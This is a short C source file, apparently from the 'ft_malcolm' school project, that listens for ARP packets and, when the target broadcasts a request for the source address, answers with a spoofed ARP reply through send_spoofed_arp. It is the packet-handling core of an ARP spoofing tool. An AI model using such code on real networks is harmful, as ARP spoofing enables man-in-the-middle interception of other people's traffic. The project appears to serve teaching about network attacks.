#include "ft_malcolm.h"

int process_packet(t_malcolm *malcolm, unsigned char *buffer, ssize_t bytes_read)
{
    if (bytes_read == 0)
    {
        return 0;
    }

    struct ethhdr *eth = (struct ethhdr *)buffer;
    if (ntohs(eth->h_proto) != ETH_P_ARP)
    {
        return 1;
    }

    t_arphdr *arp = (t_arphdr *)(buffer + sizeof(struct ethhdr));
    malcolm->packet.eth = eth;
    malcolm->packet.arp = arp;

    if (is_broadcast_request(&malcolm->packet) &&
        is_request(&malcolm->packet) &&
        is_from_target(malcolm, &malcolm->packet) &&
        is_requesting_source(malcolm, &malcolm->packet))
    {

        if (malcolm->verbose)
        {
            verbose(malcolm);
        }
        return send_spoofed_arp(malcolm);
    }

    return 1;
}

int read_and_process_packets(t_malcolm *malcolm)
{
    socklen_t addrlen = sizeof(struct sockaddr_ll);
    unsigned char buffer[BUFF_SIZE];
    ssize_t bytes_read;
    int ok = 1;

    while (ok > 0)
    {
        bytes_read = recvfrom(malcolm->sockfd, buffer, BUFF_SIZE, 0,
                              (struct sockaddr *)&malcolm->sll, &addrlen);

        if (bytes_read < 0)
        {
            errno = ENOMEM;
            ok = handle_error("recvfrom");
        }
        else
        {
            ok = process_packet(malcolm, buffer, bytes_read);
        }
    }

    return ok;
}